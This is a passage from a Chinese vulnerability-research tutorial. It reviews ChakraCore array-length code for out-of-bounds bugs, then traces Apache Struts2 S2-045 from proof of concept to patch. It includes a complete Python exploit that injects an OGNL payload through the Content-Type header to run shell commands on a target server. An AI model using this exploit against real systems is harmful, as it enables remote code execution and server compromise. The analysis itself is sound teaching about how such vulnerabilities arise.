+<p>JavascriptArray 是继承ArrayObject 的,我们来看看JavascriptArray 的构造函数</p>
+<pre><code class="language-c++">
+    JavascriptArray::JavascriptArray(uint32 length, DynamicType * type)
+        : ArrayObject(type, false, length)
+    {
+        Assert(JavascriptArray::Is(type-&gt;GetTypeId()));
+        Assert(EmptySegment-&gt;length == 0 &amp;&amp; EmptySegment-&gt;size == 0 &amp;&amp; EmptySegment-&gt;next == NULL);
+        InitArrayFlags(DynamicObjectFlags::InitialArrayValue);
+        SetHeadAndLastUsedSegment(const_cast&lt;SparseArraySegmentBase *&gt;(EmptySegment));
+    }
+
+</code></pre>
+<p>由此可知,JavascriptArray 初始化长度length 最后传递给ArrayObject 的构造函数.</p>
+<pre><code class="language-c++">
+    ArrayObject(DynamicType * type, bool initSlots = true, uint32 length = 0)
+        : DynamicObject(type, initSlots), length(length)
+    {
+
+</code></pre>
+<p>弄明白了<code>JavascriptArray-&gt;length</code> 之后,再来理解<code>OP_GetLength</code> .前面说过,Op_GetLength 是JavaScript 属性length 设置的值.现在我们来分析一下代码</p>
+<pre><code class="language-c++">
+    uint64 JavascriptArray::OP_GetLength(Var obj, ScriptContext *scriptContext)  //  lib/runtime/library/JavascriptArray.cpp:3025
+    {
+        if (scriptContext-&gt;GetConfig()-&gt;IsES6ToLengthEnabled())
+        {
+            // Casting to uint64 is okay as ToLength will always be &gt;= 0.
+            return (uint64)JavascriptConversion::ToLength(JavascriptOperators::OP_GetLength(obj, scriptContext), scriptContext);
+        }
+        else
+        {
+            return (uint64)JavascriptConversion::ToUInt32(JavascriptOperators::OP_GetLength(obj, scriptContext), scriptContext);
+        }
+    }
+
+</code></pre>
+<p>这段代码里面有两个OP_GetLength ,分别是<code>JavascriptArray::OP_GetLength</code> 和<code>JavascriptOperators::OP_GetLength</code> ,他们需要的函数参数都是<code>Var obj</code> 和<code>ScriptContext *scriptContext</code> ,参数obj 的意思是当前对象,参数scriptContext 的意思是JavaScript 执行环境上下文.再去阅读<code>JavascriptOperators::OP_GetLength()</code></p>
+<pre><code class="language-c++">
+    Var JavascriptOperators::OP_GetLength(Var instance, ScriptContext* scriptContext)
+    {
+        return JavascriptOperators::OP_GetProperty(instance, PropertyIds::length, scriptContext);
+    }
+
+</code></pre>
+<p>看到这里读者们应该理解了,OP_GetLength 就是读取对象属性length 的值,再看看<code>JavascriptOperators::OP_GetProperty()</code> 的代码</p>
+<pre><code class="language-c++">
+    Var JavascriptOperators::OP_GetProperty(Var instance, PropertyId propertyId, ScriptContext* scriptContext)
+    {
+        RecyclableObject* object = nullptr;
+        if (FALSE == JavascriptOperators::GetPropertyObject(instance, scriptContext, &amp;object))  //  找不到对象的属性
+        {
+            if (scriptContext-&gt;GetThreadContext()-&gt;RecordImplicitException())
+            {
+                JavascriptError::ThrowTypeError(scriptContext, JSERR_Property_CannotGet_NullOrUndefined, scriptContext-&gt;GetPropertyName(propertyId)-&gt;GetBuffer());
+            }
+            else
+            {
+                return scriptContext-&gt;GetLibrary()-&gt;GetUndefined();  //  返回undefined 的值
+            }
+        }
+
+        Var result = JavascriptOperators::GetPropertyNoCache(instance, object, propertyId, scriptContext);  //  拿到对象属性的值
+        AssertMsg(result != nullptr, &quot;result null in OP_GetProperty&quot;);
+        return result;
+    }
+
+</code></pre>
+<p>聪明的你应该开始举一反三了,右键JavascriptOperators::OP_GetLength 搜素引用,开开心心挖漏洞.下面截个搜素引用结果的图</p>
+<p><img src="pic4/find_get_length.png" alt="" /></p>
+<p>挑一些引用到Length 引用的地方,大部分JavaScript 执行引擎的OOB 漏洞都是因为长度可以被控制产生的问题</p>
+<p><img src="pic4/get_source.png" alt="" /></p>
+<p><img src="pic4/set.png" alt="" /></p>
+<p><img src="pic4/incorrect_using_script_object_attribute_Javascrip.png" alt="" /></p>
+<h2 id="结合poc-和源码来理解这类漏洞的原理"><a class="header" href="#结合poc-和源码来理解这类漏洞的原理">结合PoC 和源码来理解这类漏洞的原理</a></h2>
+<p>前面说了很多二进制(主要是C/C++ )的例子,现在来一个JAVA 库Struts2 的分析.以S2-045 为例子,从PoC 到触发漏洞的原理再深入理解WEB 类漏洞是怎么来挖的.我去百度了一个S2-045 的EXP .</p>
+<pre><code class="language-python">
+    import urllib2
+    import sys
+    from poster.encode import multipart_encode
+    from poster.streaminghttp import register_openers
+
+    def poc():
+        register_openers()
+        datagen, header = multipart_encode({&quot;image1&quot;: open(&quot;tmp.txt&quot;, &quot;rb&quot;)})  #  构造Post 数据包
+        header[&quot;User-Agent&quot;]=&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36&quot;
+        header[&quot;Content-Type&quot;]=&quot;%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ifconfig').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}&quot;  #  在Content-Type 中插入OGNL 利用代码
+        request = urllib2.Request(str(sys.argv[1]),datagen,headers=header)  #  发送EXP
+        response = urllib2.urlopen(request)
+        print response.read()
+
+    poc()
+
+</code></pre>
+<p>从PoC 里我们得知,恶意代码是从<code>Content-Type</code> 里面传递到漏洞点执行的.翻了翻Issus ,找到当时修复的Diff ,Link:https://github.com/apache/struts/commit/b06dd50af2a3319dd896bf5c2f4972d2b772cf2b</p>
+<p><img src="pic4/struts2_fix.png" alt="" /></p>
+<p><img src="pic4/struts2_fix_diff.png" alt="" /></p>
+<p>是不是觉得很神奇,是下面这句代码引发的血案</p>
+<pre><code class="language-java">
+    for (LocalizedMessage error : multiWrapper.getErrors()) {
+        if (validation != null) {
+            validation.addActionError(LocalizedTextUtil.findText(error.getClazz(), error.getTextKey(), ActionContext.getContext().getLocale(), error.getDefaultMessage(), error.getArgs()));
+
+</code></pre>
+<p>无论是WEB 还是二进制漏洞,本质上都是找到一个可以做到远程代码执行的地方.二进制里大多数的远程代码执行漏洞都是由于内存操作不当而引起的(想了解更多关于二进制因内存操作不当导致的远程代码执行的知识,请到这里了解更多:https://github.com/lcatro/vuln_javascript ),但是不排除有因为函数调用没有正确过滤而导致的代码执行问题(参考CVE-2018-1000006 ,Commit:https://github.com/electron/electron/commit/c49cb29ddf3368daf279bd60c007f9c015bc834c );WEB 里的漏洞基本上都是因为调用敏感函数的问题导致的安全问题,比如:system() 远程命令执行,eval() 一句话木马,mysql_query() 数据库注入和现在要介绍的OGNL 执行函数.<strong>如果没有对输入做校验和字符过滤,很有可能会让用户的输入流到敏感函数,导致远程代码执行,服务器被Getshell</strong>.</p>
+<p>现在回来看看上面的代码,到底哪儿出现了问题呢?我们先来阅读<code>LocalizedTextUtil.findText()</code> 的源码.在<code>core/src/main/java/com/opensymphony/xwork2/util/AbstractLocalizedTextProvider.java:194</code> 行</p>
+<pre><code class="language-java">
+    /**
+     * &lt;p&gt;
+     * Finds a localized text message for the given key, aTextName, in the specified resource
+     * bundle.
+     * &lt;/p&gt;
+     *
+     * &lt;p&gt;
+     * If a message is found, it will also be interpolated.  Anything within &lt;code&gt;${...}&lt;/code&gt;
+     * will be treated as an OGNL expression and evaluated as such.
+     * &lt;/p&gt;
+     *
+     * &lt;p&gt;
+     * If a message is &lt;b&gt;not&lt;/b&gt; found a WARN log will be logged.
+     * &lt;/p&gt;
+     *
+     * @param bundle         the bundle
+     * @param aTextName      the key
+     * @param locale         the locale
+     * @param defaultMessage the default message to use if no message was found in the bundle
+     * @param args           arguments for the message formatter.
+     * @param valueStack     the OGNL value stack.
+     * @return the localized text, or null if none can be found and no defaultMessage is provided
+     */
+    @Override
+    public String findText(ResourceBundle bundle, String aTextName, Locale locale, String defaultMessage, Object[] args,
+                           ValueStack valueStack) {
+        try {
+            reloadBundles(valueStack.getContext());
+
+            String message = TextParseUtil.translateVariables(bundle.getString(aTextName), valueStack);
+            MessageFormat mf = buildMessageFormat(message, locale);
+
+            return formatWithNullDetection(mf, args);
+        } catch (MissingResourceException ex) {
+            if (devMode) {
+                LOG.warn(&quot;Missing key [{}] in bundle [{}]!&quot;, aTextName, bundle);
+            } else {
+                LOG.debug(&quot;Missing key [{}] in bundle [{}]!&quot;, aTextName, bundle);
+            }
+        }
+
+        GetDefaultMessageReturnArg result = getDefaultMessage(aTextName, locale, valueStack, args, defaultMessage);
+        if (unableToFindTextForKey(result)) {
+            LOG.warn(&quot;Unable to find text for key '{}' in ResourceBundles for locale '{}'&quot;, aTextName, locale);
+        }
+        return result != null ? result.message : null;
+    }
+
+</code></pre>
+<p>看到这里是不是懵逼了.我们一个个函数点进去看看,究竟都有些什么东西,但是限于篇幅,我就不全部把代码贴上来了,现在只放出一个关键函数的代码</p>
+<pre><code class="language-java">
+    /**
+     * @return the default message.
+     */
+    protected GetDefaultMessageReturnArg getDefaultMessage(String key, Locale locale, ValueStack valueStack, Object[] args,
+                                                                String defaultMessage) {
+        GetDefaultMessageReturnArg result = null;
+        boolean found = true;
+
+        if (key != null) {
+            String message = findDefaultText(key, locale);
+
+            if (message == null) {
+                message = defaultMessage;
+                found = false; // not found in bundles
+            }
+
+            // defaultMessage may be null
+            if (message != null) {
+                MessageFormat mf = buildMessageFormat(TextParseUtil.translateVariables(message, valueStack), locale);
+
+                String msg = formatWithNullDetection(mf, args);
+                result = new GetDefaultMessageReturnArg(msg, found);
+            }
+        }
+
+        return result;
+    }
+
+</code></pre>
+<p>还是使用上面的方式,一个个函数点进去看看,我们无需要对每个细节都要完全理解,但是要知道做了些什么,读者们可以通过函数名或者函数的逻辑来推断出来到底发生了什么事.继续往下探索,找到<code>translateVariables()</code> 的声明.</p>
+<pre><code class="language-java">
+    /**
+     * Converts all instances of ${...}, and %{...} in &lt;code&gt;expression&lt;/code&gt; to the value returned
+     * by a call to {@link ValueStack#findValue(java.lang.String)}. If an item cannot
+     * be found on the stack (null is returned), then the entire variable ${...} is not
+     * displayed, just as if the item was on the stack but returned an empty string.
+     *
+     * @param expression an expression that hasn't yet been translated
+     * @param stack value stack
+     * @return the parsed expression
+     */
+    public static String translateVariables(String expression, ValueStack stack) {
+        return translateVariables(new char[]{'$', '%'}, expression, stack, String.class, null).toString();
+    }
+
+</code></pre>
+<p>??? ,这个函数居然是执行OGNL 表达式的.我们再一路往下找.</p>
+<pre><code class="language-java">
+    //  经过多个重载之后..
+
+    /**
+     * Converted object from variable translation.
+     *
+     * @param openChars open character array
+     * @param expression expression string
+     * @param stack value stack
+     * @param asType as class type
+     * @param evaluator value evaluator
+     * @param maxLoopCount max loop count
+     * @return Converted object from variable translation.
+     */
+    public static Object translateVariables(char[] openChars, String expression, final ValueStack stack, final Class asType, final ParsedValueEvaluator evaluator, int maxLoopCount) {
+
+        ParsedValueEvaluator ognlEval = new ParsedValueEvaluator() {
+            public Object evaluate(String parsedValue) {
+                Object o = stack.findValue(parsedValue, asType);
+                if (evaluator != null &amp;&amp; o != null) {
+                    o = evaluator.evaluate(o.toString());
+                }
+                return o;
+            }
+        };
+
+        TextParser parser = ((Container)stack.getContext().get(ActionContext.CONTAINER)).getInstance(TextParser.class);
+
+        return parser.evaluate(openChars, expression, ognlEval, maxLoopCount);  //  执行OGNL 表达式
+    }
+
+</code></pre>
+<p>现在可以确定,<code>TextParseUtil.translateVariables()</code> 可以执行OGNL 表达式.参数1 是OGNL 表达式字符串,参数2 是值栈.知道这点之后,回来阅读这里的代码</p>
+<pre><code class="language-java">
+    protected GetDefaultMessageReturnArg getDefaultMessage(String key, Locale locale, ValueStack valueStack, Object[] args,
+                                                                String defaultMessage) {
+        GetDefaultMessageReturnArg result = null;
+        boolean found = true;
+
+        if (key != null) {
+            String message = findDefaultText(key, locale);
+
+            if (message == null) {
+                message = defaultMessage;
+                found = false; // not found in bundles
+            }
+
+            // defaultMessage may be null
+            if (message != null) {
+                MessageFormat mf = buildMessageFormat(TextParseUtil.translateVariables(message, valueStack), locale);
+
+</code></pre>
+<p>也就是说,getDefaultMessage() 函数的defaultMessage 参数是可以执行OGNL 表达式的,而且defaultMessage 是由findText() 传递过来的.咱们还是去查查Strust2 的官方文档一探究竟.Link :https://struts.apache.org/maven/struts2-core/apidocs/index.html</p>
+<p><img src="pic4/document.png" alt="" /></p>
+<p>官方文档竟然没有关于参数的介绍,那没关系,我们去找<code>LocalizedTextUtil.findText()</code></p>
+<p><img src="pic4/document1.png" alt="" /></p>
+<p>??? .兄弟,这是几个意思?看来你这样要为难我小叮当啊.然后在谷歌百度胡乱搜了一下,结果找到了.</p>
+<p><img src="pic4/document2.png" alt="" /></p>
+<p>好了,LocalizedTextUtil.findText() 的defaultMessage 参数既然可以执行OGNL 语句,那么我们再来看看Diff 的代码</p>
+<pre><code class="language-java">
+    for (LocalizedMessage error : multiWrapper.getErrors()) {
+        if (validation != null) {
+            validation.addActionError(LocalizedTextUtil.findText(error.getClazz(), error.getTextKey(), ActionContext.getContext().getLocale(), error.getDefaultMessage(), error.getArgs()));
+
+</code></pre>
+<p>居然是把一个错误提示信息拿来做参数,来看看LocalizedMessage 和multiWrapper.getErrors() 是什么</p>
+<pre><code class="language-java">
+    HttpServletRequest request = (HttpServletRequest) ac.get(ServletActionContext.HTTP_REQUEST);
+
+    if (!(request instanceof MultiPartRequestWrapper)) {  //  如果request 不是MultiPartRequestWrapper 的示例,那就继续往下执行
+        if (LOG.isDebugEnabled()) {
+            ActionProxy proxy = invocation.getProxy();
+            LOG.debug(getTextMessage(&quot;struts.messages.bypass.request&quot;, new String[]{proxy.getNamespace(), proxy.getActionName()}));
+        }
+
+        return invocation.invoke();  //  执行下一个invocation
+    }
+
+    // ...
+
+    MultiPartRequestWrapper multiWrapper = (MultiPartRequestWrapper) request;  //  获取Post Data 部分
+
+    if (multiWrapper.hasErrors() &amp;&amp; validation != null) {
+        TextProvider textProvider = getTextProvider(action);
+        for (LocalizedMessage error : multiWrapper.getErrors()) {
+
+</code></pre>
+<p>看到这里,可能读者们开始迷惑了,当时我也一样,看到这个代码结果确实有些头晕,不知道自己看的代码究竟在哪一部分,这个时候,我们就应该去找一找架构图</p>
+<p><img src="pic4/strust2_arch.png" alt="" /></p>
+<p>看完了架构图之后,估计读者会分化为两部分了:瞬间明白整体原理和越看越懵逼的,我当时看这个架构图的时候就是属于越看越懵逼的那种哈哈哈.Struts2 是AOP (面向切面编程,意思是数据一层一层往上来处理,RASP 就是这个原理)模型.每个Interceptor 都对应不同的功能.触发漏洞的地方是在FileUploadInterceptor ,FileUploadInterceptor 是需要MultiPartRequestWrapper (对应MultiPartRequest)处理过的请求头,那么我们去找一下Struts2 关于MultiPartRequest 的请求,看看是在哪个Interceptor 里面处理的.现在我们看看Struts2 的Interceptor 的默认配置文件.代码位置<code>core/src/main/resources/struts-default.xml</code> ,Link : https://github.com/apache/struts/blob/a4439376b806fa73f96f469315d51ad83591b796/core/src/main/resources/struts-default.xml</p>
+<pre><code class="language-xml">
+    &lt;bean type=&quot;org.apache.struts2.dispatcher.multipart.MultiPartRequest&quot; name=&quot;jakarta&quot; class=&quot;org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest&quot; scope=&quot;prototype&quot;/&gt;
+    &lt;bean type=&quot;org.apache.struts2.dispatcher.multipart.MultiPartRequest&quot; name=&quot;jakarta-stream&quot; class=&quot;org.apache.struts2.dispatcher.multipart.JakartaStreamMultiPartRequest&quot; scope=&quot;prototype&quot;/&gt;
+
+</code></pre>
+<p>原来MultiPartRequest 使用JakartaMultiPartRequest 和JakartaStreamMultiPartRequest 来做处理.那么现在看看MultiPartRequestWrapper 类的构造函数,Link :https://github.com/apache/struts/blob/6e96f11debc4fa52c65a12b28fea82b514b96abd/core/src/main/java/org/apache/struts2/dispatcher/multipart/MultiPartRequestWrapper.java</p>
+<pre><code class="language-java">
+    /**
+     * Process file downloads and log any errors.
+     *
+     * @param multiPartRequest Our MultiPartRequest object
+     * @param request Our HttpServletRequest object
+     * @param saveDir Target directory for any files that we save
+     * @param provider locale provider
+     * @param disableRequestAttributeValueStackLookup disable the request attribute value stack lookup
+     */
+    public MultiPartRequestWrapper(MultiPartRequest multiPartRequest, HttpServletRequest request,
+                                   String saveDir, LocaleProvider provider,
+                                   boolean disableRequestAttributeValueStackLookup) {
+        super(request, disableRequestAttributeValueStackLookup);
+        errors = new ArrayList&lt;&gt;();
+        multi = multiPartRequest;  //  multi 是初始化MultiPartRequestWrapper 传递进来的MultiPartRequest
+        defaultLocale = provider.getLocale();
+        setLocale(request);
+        try {
+            multi.parse(request, saveDir);  //  注意,解析request 请求头数据
+            for (LocalizedMessage error : multi.getErrors()) {
+                addError(error);
+            }
+        } catch (IOException e) {
+            LOG.warn(e.getMessage(), e);
+            addError(buildErrorMessage(e, new Object[] {e.getMessage()}));
+        }
+    }
+
+</code></pre>
+<p>我们来看看Struts2 的文件上传部分.Link :https://github.com/apache/struts/blob/6e96f11debc4fa52c65a12b28fea82b514b96abd/core/src/main/java/org/apache/struts2/dispatcher/filter/StrutsPrepareAndExecuteFilter.java</p>
+<pre><code class="language-java">
+    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain) throws IOException, ServletException {
+
+        HttpServletRequest request = (HttpServletRequest) req;
+        HttpServletResponse response = (HttpServletResponse) res;
+
+        try {
+            String uri = RequestUtils.getUri(request);
+            if (excludedPatterns != null &amp;&amp; prepare.isUrlExcluded(request, excludedPatterns)) {
+                LOG.trace(&quot;Request {} is excluded from handling by Struts, passing request to other filters&quot;, uri);
+                chain.doFilter(request, response);
+            } else {
+                LOG.trace(&quot;Checking if {} is a static resource&quot;, uri);
+                boolean handled = execute.executeStaticResourceRequest(request, response);
+                if (!handled) {
+                    LOG.trace(&quot;Assuming uri {} as a normal action&quot;, uri);
+                    prepare.setEncodingAndLocale(request, response);
+                    prepare.createActionContext(request, response);
+                    prepare.assignDispatcherToThread();
+                    request = prepare.wrapRequest(request);  //  解析请求头
+                    ActionMapping mapping = prepare.findActionMapping(request, response, true);
+                    if (mapping == null) {
+                        LOG.trace(&quot;Cannot find mapping for {}, passing to other filters&quot;, uri);
+                        chain.doFilter(request, response);
+                    } else {
+                        LOG.trace(&quot;Found mapping {} for {}&quot;, mapping, uri);
+                        execute.executeAction(request, response, mapping);
+                    }
+                }
+            }
+        } finally {
+            prepare.cleanupRequest(request);
+        }
+    }
+
+    public HttpServletRequest wrapRequest(HttpServletRequest oldRequest) throws ServletException {
+        HttpServletRequest request = oldRequest;
+        try {
+            // Wrap request first, just in case it is multipart/form-data
+            // parameters might not be accessible through before encoding (ww-1278)
+            request = dispatcher.wrapRequest(request);  //  wrapRequest()
+            ServletActionContext.setRequest(request);
+        } catch (IOException e) {
+            throw new ServletException(&quot;Could not wrap servlet request with MultipartRequestWrapper!&quot;, e);
+        }
+        return request;
+    }
+
+    public HttpServletRequest wrapRequest(HttpServletRequest request) throws IOException {
+        // don't wrap more than once
+        if (request instanceof StrutsRequestWrapper) {
+            return request;
+        }
+
+        String content_type = request.getContentType();
+        if (content_type != null &amp;&amp; content_type.contains(&quot;multipart/form-data&quot;)) {  //  根据Content_Type 的内容来判断是否选择MultiPartRequestWrapper
+            MultiPartRequest mpr = getMultiPartRequest();
+            LocaleProvider provider = getContainer().getInstance(LocaleProvider.class);
+            request = new MultiPartRequestWrapper(mpr, request, getSaveDir(), provider, disableRequestAttributeValueStackLookup);
+        } else {
+            request = new StrutsRequestWrapper(request, disableRequestAttributeValueStackLookup);
+        }
+
+        return request;
+    }
+
+</code></pre>
+<p>搞明白了Content-Type 为什么需要带上multipart/form-data 之后.再回过头来看漏洞描述,这个问题的触发点在JakartaStreamMultiPartRequest 这里.现在去找<code>JakartaStreamMultiPartRequest.parse()</code> 函数的实现代码.Link :https://github.com/apache/struts/blob/6e96f11debc4fa52c65a12b28fea82b514b96abd/core/src/main/java/org/apache/struts2/dispatcher/multipart/JakartaMultiPartRequest.java</p>
+<pre><code class="language-java">
+    public void parse(HttpServletRequest request, String saveDir) throws IOException {
+        try {
+            setLocale(request);
+            processUpload(request, saveDir);  //  处理上传请求
+        } catch (Exception e) {
+            LOG.warn(&quot;Error occurred during parsing of multi part request&quot;, e);
+            LocalizedMessage errorMessage = buildErrorMessage(e, new Object[]{});  //  保存错误消息
+            if (!errors.contains(errorMessage)) {
+                errors.add(errorMessage);
+            }
+        }
+    }
+
+</code></pre>
+<p>在此就不再往下分析了,最后会触发一个异常,让Content-Type 里面的值保存到errors 对象中</p>
+<pre><code class="language-java">
+    public abstract class AbstractMultiPartRequest implements MultiPartRequest {
+
+        protected List&lt;LocalizedMessage&gt; errors = new ArrayList&lt;&gt;();
+
+        public List&lt;LocalizedMessage&gt; getErrors() {  //  获取errors 的信息..
+            return errors;
+        }
+
+</code></pre>
+<p>最后,我们回来看看patch 的代码</p>
+<pre><code class="language-java">
+    for (LocalizedMessage error : multiWrapper.getErrors()) {
+        if (validation != null) {
+            validation.addActionError(LocalizedTextUtil.findText(error.getClazz(), error.getTextKey(), ActionContext.getContext().getLocale(), error.getDefaultMessage(), error.getArgs()));
+
+</code></pre>
+<p>此时,由于Content-Type 的值导致Struts2 的JakartaStreamMultiPartRequest 解析异常,异常信息保存在<code>multiWrapper.getErrors()</code> 里,<code>LocalizedMessage error</code> 里面的还带有Content-Type 的值.这个内容传递到了<code>LocalizedTextUtil.findText()</code> ,这个地方是可以执行OGNL 语句的.那么我们在Content-Type 里面插入了OGNL 语句之后,触发异常,让Content-Type 的值保存到异常信息传递给<code>LocalizedTextUtil.findText()</code>,<code>LocalizedTextUtil.findText()</code> 执行了我们注入的OGNL 语句,引发了远程代码执行.</p>
+<h2 id="结尾"><a class="header" href="#结尾">结尾</a></h2>
+<p>读代码时比较迷惘,可以尝试换一个地方从新来读;读代码时比较迷惘,可以尝试谷歌百度搜素一下其他人的分析和用法;读代码时比较迷惘,可以尝试看看官方文档;读代码时比较迷惘,可以尝试换个歌单听一听.<strong>切记!不要烦躁</strong></p>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+                            <a rel="prev" href="3.Fuzzing.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                                <i class="fa fa-angle-left"></i>
+                            </a>
+
+                            <a rel="next" href="5.compile.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                                <i class="fa fa-angle-right"></i>
+                            </a>
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+                    <a rel="prev" href="3.Fuzzing.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                        <i class="fa fa-angle-left"></i>
+                    </a>
+
+                    <a rel="next" href="5.compile.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                        <i class="fa fa-angle-right"></i>
+                    </a>
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="elasticlunr.min.js"></script>
+        <script src="mark.min.js"></script>
+        <script src="searcher.js"></script>
+
+        <script src="clipboard.min.js"></script>
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS scripts -->
+        <script src="theme/pagetoc.js"></script>
+
+
+    </div>
+    </body>
+</html>
